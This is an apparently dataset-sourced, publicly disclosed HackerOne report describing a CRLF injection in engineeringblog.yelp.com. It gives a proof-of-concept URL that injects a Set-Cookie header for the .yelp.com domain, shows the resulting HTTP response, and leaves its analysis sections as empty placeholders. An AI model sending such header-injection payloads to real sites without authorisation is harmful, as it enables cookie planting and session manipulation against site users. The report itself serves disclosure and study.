---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '66391'
original_report_id: '66391'
title: '[engineeringblog.yelp.com] CRLF Injection'
team_handle: yelp
created_at: '2015-06-07T09:02:26.025Z'
disclosed_at: '2017-11-09T20:12:42.951Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 14
tags:
- hackerone
---

# [engineeringblog.yelp.com] CRLF Injection

## Metadata

- HackerOne Report ID: 66391
- Weakness: 
- Program: yelp
- Disclosed At: 2017-11-09T20:12:42.951Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

CRLF Injection via Request-URI

PoC:

```
https://engineeringblog.yelp.com/xxcrlftest%0d%0aSet-Cookie:%20test=test;domain=.yelp.com
```
HTTP Response:
```
HTTP/1.1 301 Moved Permanently
...
Location: http://engineeringblog.yelp.com/xxcrlftest
Set-Cookie: test=test;domain=.yelp.com
```
Result:
Creating a cookie-param "test=test" on *.yelp.com

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
